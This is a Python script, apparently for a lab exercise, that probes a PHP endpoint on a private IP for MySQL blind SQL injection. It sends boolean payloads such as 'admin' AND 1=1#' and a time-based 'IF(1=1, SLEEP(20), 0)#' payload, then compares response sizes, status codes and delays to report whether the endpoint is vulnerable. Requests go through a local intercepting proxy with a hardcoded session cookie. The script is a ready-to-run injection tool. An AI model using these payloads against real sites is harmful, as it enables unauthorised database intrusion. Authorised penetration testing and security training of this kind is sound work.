import requests
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# TARGET CONFIGURATION ZONE
# ==========================================
LAB_BASE_URL = "http://192.168.219.16"
PATH = "/blindsqli.php"
PARAM_NAME = "user"
VALUE = "admin"

SLEEP_TIME = 20

PROXIES = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
COOKIES = {
    'PHPSESSID': 'bde10d96950e1de84312dbb4659dffe0'
}
# ==========================================

def run_mysql_blind_check():
    full_url = LAB_BASE_URL.rstrip('/') + PATH
    print(f"[*] Testing Target Endpoint: {full_url}")
    print(f"[*] Target Parameter: ?{PARAM_NAME}={VALUE}\n")

    # ----------------------------------------------------
    # 1. BOOLEAN BLIND CHECK (Tracking Byte Sizes)
    # ----------------------------------------------------
    print("[+] Phase 1: Testing Boolean-Based Blind Logic...")
    # Switched to '#' to cleanly terminate MySQL queries
    true_payload = f"{VALUE}' AND 1=1#"
    false_payload = f"{VALUE}' AND 1=2#"

    try:
        r_true = requests.get(full_url, params={PARAM_NAME: true_payload}, verify=False, proxies=PROXIES, cookies=COOKIES)
        r_false = requests.get(full_url, params={PARAM_NAME: false_payload}, verify=False, proxies=PROXIES, cookies=COOKIES)
        
        len_true = len(r_true.text)
        len_false = len(r_false.text)
        
        print(f"    -> True payload response:  Status {r_true.status_code} | Size: {len_true} bytes")
        print(f"    -> False payload response: Status {r_false.status_code} | Size: {len_false} bytes")
        
        if r_true.status_code != r_false.status_code:
            print("[🏆] VULNERABLE! Boolean Blind condition confirmed via Status Code mismatch.")
        elif len_true != len_false:
            print("[🏆] VULNERABLE! Boolean Blind condition confirmed via Response Size (bytes) delta.")
        else:
            print("[-] Boolean metrics matched. Symmetrical layout.")
            
    except Exception as e:
        print(f"[-] Boolean phase connection failure: {e}")

    print("-" * 50)

    # ----------------------------------------------------
    # 2. TIME-BASED BLIND CHECK (MySQL Syntax Fixed)
    # ----------------------------------------------------
    print("[+] Phase 2: Testing MySQL Time-Based Blind Logic...")
    # Switched comment from '--' to '#' to ensure MySQL parses it correctly
    time_payload = f"{VALUE}' AND IF(1=1, SLEEP({SLEEP_TIME}), 0)#"
    
    start_time = time.time()
    try:
        print(f"    -> Sending sleep payload: {time_payload}")
        r = requests.get(full_url, params={PARAM_NAME: time_payload}, verify=False, proxies=PROXIES, cookies=COOKIES, timeout=SLEEP_TIME + 4)
        elapsed = time.time() - start_time
        print(f"    -> Execution completed in {elapsed:.2f} seconds.")
        
        if elapsed >= SLEEP_TIME:
            print(f"[🏆] VULNERABLE! MySQL Time-Based Blind detected via loading latency.")
            
    except requests.exceptions.Timeout:
        print(f"[🏆] VULNERABLE! Target connection timed out as expected (Database sleeping).")
    except Exception as e:
        print(f"[-] Time phase failure: {e}")

if __name__ == "__main__":
    run_mysql_blind_check()